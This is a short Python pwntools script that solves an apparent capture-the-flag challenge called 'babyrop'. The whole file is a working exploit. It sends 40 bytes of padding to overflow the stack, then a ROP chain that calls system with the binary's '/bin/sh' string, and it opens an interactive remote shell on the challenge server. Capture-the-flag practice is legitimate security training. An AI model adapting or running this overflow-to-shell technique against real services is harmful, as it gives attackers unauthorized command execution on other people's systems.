from pwn import *

##threshold: 40 for just nice null byte override

context.arch = 'amd64'
elf = ELF("./babyrop")
#p = elf.process()
p = remote("challs1.nusgreyhats.org", 5012)

rop = ROP(elf)
rop.call("puts", [next(elf.search(b"/bin/sh"))])
rop.call("system", [next(elf.search(b"/bin/sh"))])

payload = [
    b"A" * 40, \
    rop.chain()
]

payload = b"".join(payload)
p.sendline(payload)

p.interactive()
